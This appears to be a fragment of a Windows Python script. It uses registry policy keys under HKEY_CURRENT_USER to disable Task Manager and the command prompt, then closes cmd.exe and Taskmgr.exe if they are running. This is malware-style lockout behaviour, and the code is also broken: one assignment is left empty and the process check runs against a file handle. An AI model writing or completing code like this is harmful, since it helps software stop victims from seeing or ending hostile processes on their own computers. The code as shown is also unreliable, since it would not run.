import subprocess
import DisableService as ds
import winreg as wr
import psutil

proc_list = open("proc_list", "w")
processes = 

wf = proc_list.write(processes)


HKCU = wr.HKEY_CURRENT_USER
CMD_REG = r'SOFTWARE\\Policies\\Microsoft\\Windows\\System'
TASKMGR_REG = r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"

ds.disableTaskMgr(HKCU, TASKMGR_REG)
ds.disableCMD(HKCU, CMD_REG)


#proc_list = subprocess.check_output('tasklist', shell=True)
if "cmd.exe" in proc_list:
    ds.closeCMD()
    
if "Taskmgr.exe" in proc_list:
    ds.closeTaskMgr()